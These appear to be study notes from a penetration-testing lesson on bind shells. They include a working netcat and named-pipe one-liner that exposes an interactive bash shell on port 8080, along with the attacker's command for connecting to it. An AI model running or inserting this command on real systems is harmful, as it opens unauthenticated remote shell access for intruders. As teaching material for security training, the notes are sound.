# 🌐 Bind Shells

## 📋 Purpose

A **bind shell** opens a port on a compromised target to listen for incoming connections, exposing a shell for remote command execution. It’s used when outgoing connections are blocked but is less common due to potential detection.

## 🔍 How Bind Shells Work

- **Setup**: The attacker runs a command on the target to bind a port and expose a shell.
- **Connection**: The attacker connects to the target’s open port to interact with the shell.
- **Challenge**: Requires the port to remain open, increasing detection risk.

## 🚀 Example Bind Shell Setup

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

- **Breakdown**:
    - `rm -f /tmp/f`: Removes existing named pipe.
    - `mkfifo /tmp/f`: Creates a named pipe for two-way communication.
    - `cat /tmp/f | bash -i 2>&1`: Reads pipe input, sends to interactive bash shell, redirects errors.
    - `nc -l 0.0.0.0 8080`: Listens on all interfaces, port 8080.
    - `> /tmp/f`: Sends output back to the pipe.
- **Port Note**: Ports below 1024 require elevated privileges; 8080 avoids this.

## 🛠 Attacker Connection

```bash
nc -nv <target-ip> 8080  # Connects to the bind shell
```

- **Options**:
    - `-n`: Disables DNS resolution.
    - `-v`: Enables verbose output.
- **Result**: Provides a shell prompt (e.g., `target@tryhackme:~$`) for command execution.

## ✅ Quick Notes

- **Bind Shell**: A shell that opens a specific port on the target for incoming attacker connections.
- **Privileged Ports**: Ports below 1024 require root access or elevated permissions.
- **Use Case**: Useful when reverse shells are blocked by firewalls.  
    --Web shells can be written in several languages supported by web servers, like PHP, ASP, JSP, and even simple CGI scripts.